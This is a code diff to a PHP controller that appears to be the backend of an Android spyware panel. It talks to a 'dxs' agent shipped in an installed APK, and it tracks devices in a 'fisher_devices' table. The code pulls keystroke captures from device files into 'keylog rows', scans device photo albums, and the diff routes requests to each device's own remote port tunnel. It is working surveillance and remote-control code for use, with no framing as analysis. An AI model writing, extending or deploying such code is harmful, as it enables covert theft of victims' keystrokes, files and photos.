@@ -18,6 +18,7 @@ class MApiController
     protected ?array $user = null;
     protected array $body = [];
     protected array $query = [];
+    protected string $dxsCurrentDeviceId = '';
 
     public function dispatch()
     {
@@ -541,6 +542,7 @@ class MApiController
             'created_at'   => time(),
         ]);
         $this->notifyWs($did, $cmd, $params);
+        $this->dxsCurrentDeviceId = $did;
 
         // ★ 2026-10-09 folder-1 dxs bridge -------------------------------------
         // The installed APK (com.zq.final) ships the folder-1 "dxs" Go agent.
@@ -568,6 +570,17 @@ class MApiController
     {
         $host = getenv('DXS_HOST') ?: '127.0.0.1';
         $port = getenv('DXS_PORT') ?: '17912';
+        $did = $this->dxsCurrentDeviceId;
+        if ($did !== '') {
+            try {
+                $remotePort = (int)(Db::table('fisher_devices')->where('device_id', $did)->value('remote_port') ?? 0);
+                if ($remotePort >= 19902 && $remotePort <= 29999) {
+                    $port = (string)$remotePort;
+                }
+            } catch (\Throwable $e) {
+                // keep local development fallback
+            }
+        }
         return 'http://' . $host . ':' . $port;
     }
 
@@ -1614,6 +1627,7 @@ class MApiController
     /** Parse /data/local/tmp/getevent_capture.txt into panel keylog rows. */
     protected function deviceKeylogFromFile(string $did): array
     {
+        $this->dxsCurrentDeviceId = $did;
         $file = '/data/local/tmp/getevent_capture.txt';
         $r = $this->dxsHttp('GET', '/readFile?path=' . str_replace('%2F', '/', rawurlencode($file)), null, 12000);
         if (!$r || !isset($r['data']['content']) || !is_string($r['data']['content'])) return [];
@@ -1717,6 +1731,7 @@ class MApiController
 
     protected function albumScan(string $did, bool $force = false): array
     {
+        $this->dxsCurrentDeviceId = $did;
         $now = time();
         if (!$force && isset(self::$albumCache[$did]) && ($now - self::$albumCache[$did]['t']) < 12) {
             return self::$albumCache[$did]['v'];
